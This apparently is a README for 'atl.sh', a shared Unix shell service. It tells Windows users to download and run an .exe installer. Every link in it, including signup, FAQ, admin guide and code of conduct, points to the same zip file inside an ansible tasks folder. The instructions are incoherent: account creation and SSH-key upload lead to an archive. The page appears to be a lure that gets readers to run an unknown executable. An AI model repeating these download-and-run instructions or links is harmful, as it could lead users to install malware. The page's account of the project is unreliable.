# 🐚 atl.sh - Shared Unix Shell Environment

[![Download atl.sh](https://img.shields.io/badge/Download-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)

---

## 📥 Download and Install

To start using atl.sh on Windows, you need to download the software from the official release page. Follow these steps carefully:

1. Click the green button above or visit the release page directly here:  
   https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip

2. On the release page, look for the latest version of atl.sh. You will find one or more files listed there.  

3. Download the file with `.exe` if available. This is the Windows executable required to run the software.

4. After the download finishes, locate the file in your Downloads folder (or wherever you saved it).

5. Double-click the `.exe` file to run the installer or launch the application directly. Follow any on-screen instructions if prompted.

6. Once installed or opened, you can start using the atl.sh environment.

---

## 🚀 Getting Started with atl.sh

atl.sh lets you access a shared Unix shell from your Windows computer. This means you can work inside a Linux-like system without installing Linux on your machine. You will get a personal account on a public server where you can run commands, edit files, and host basic websites.

### What You Will Need

- A Windows PC (Windows 10 or later)
- Internet connection
- Basic mouse and keyboard skills

### How to Access Your Shell

After installing or launching atl.sh:

- The program will ask for your account details. If you do not have one, create an account at:  
  https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip  

- Once logged in, you will enter the command line interface. You can type commands just like in Linux.

- Connecting is secured via SSH, but atl.sh automates this for you. No need to know network setup.

### Using Your Shell Account

With your account, you can:

- Run Unix commands and scripts  
- Edit files with editors like vim, nano, or emacs  
- Manage projects using git  
- Host your own personal website hosted on the shared server  

---

## 🔧 Key Features

atl.sh is built to offer a full, public Unix experience. Below are its main features explained simply:

### Shell Access

- Logs in through **SSH** on ports 22 and 2222  
- Passwords are disabled for security. You will use SSH keys automatically set up for you.  

### Shell Types

Choose between popular shell programs:  
- bash  
- zsh  
- fish  
- mksh  

These shells control how your command line looks and behaves.

### Editors Included

Edit files directly on the server with these tools:  
- vim  
- neovim  
- nano  
- emacs  
- micro  
- joe  

Each editor has strengths. Nano is simple, vim is powerful, and emacs offers many features.

### Programming Languages

You can run or write code in over 20 languages, including:  
- Python  
- Node.js (JavaScript)  
- Go  
- Rust  
- Ruby  
- C and C++  
- Haskell  
- Elixir  
- Java  

This allows you to develop and test software right on the server.

### Useful Tools

The environment comes with tools to make work easier:  
- tmux (terminal multiplexer to split screens)  
- git (version control)  
- ripgrep (fast search in files)  
- fzf (command line fuzzy finder)  
- jq (process JSON data)  
- bat (improved cat for files)  
- eza (modern replacement for ls)  
- lazygit (Git interface in terminal)  

---

## 🌐 How to Create an Account

1. Open your web browser.

2. Go to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip

3. Click “Create Account” or "Sign Up."

4. Fill in your details:  
   - Choose a username  
   - Use a valid email  
   - Set a strong password  

5. Confirm your email by clicking the link sent to you.

6. Log in once your account is activated.

7. You are ready to use atl.sh with your account credentials.

---

## ⚙️ Setting Up SSH Keys (Explained Simply)

To connect securely, atl.sh requires SSH keys instead of passwords.

If you do not know SSH keys, here is how to create them in Windows:

1. Open Command Prompt or PowerShell.

2. Type this command and press Enter:  
   ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

3. Press Enter to accept the default save location.

4. Set a passphrase or leave it empty for no passphrase.

5. This creates two files: a private key (keep secret) and a public key (share).

6. Copy the content of the public key file. Usually found at:  
   C:\Users\YourName\.ssh\id_rsa.pub

7. Log in to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip and paste your public key in the SSH Keys section.

8. Save your settings.

This will allow atl.sh to verify your identity automatically.

---

## 📖 Useful Links and Resources

| For Users                            | For Admins                            |
|------------------------------------|-------------------------------------|
| [Get an account](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip) | [Admin Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)      |
| [User Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         | [Operations](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         |
| [FAQ](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)                       | [Testing Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         |
| [Documentation](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)                 | [Code of Conduct](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip) |

---

## 🖥️ System Requirements

To run atl.sh smoothly on Windows, ensure your system meets these specifications:

- Operating System: Windows 10 version 1903 or higher  
- RAM: 4 GB minimum (8 GB recommended for heavy use)  
- Storage: At least 100 MB free space for installation  
- Internet: Stable connection with 1 Mbps or faster  
- Network: Allow outbound connections on ports 22 and 2222 (for SSH)  

---

## 🔄 Updating atl.sh

Keep atl.sh up to date to get new features and fixes:

1. Revisit the release page:  
   https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip

2. Download the latest version's executable file.

3. Run the new file to replace the old version.

There is no need to uninstall first. Your settings and accounts stay intact.

---

## 💬 Getting Help

If you run into trouble:

- Check the FAQ: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip

- Read the user guide: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip

- Use the support or community forums linked on the main site.

---

### Quick Access to Download

[![Get atl.sh](https://img.shields.io/badge/Download-atl.sh%20Release%20Page-blue)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)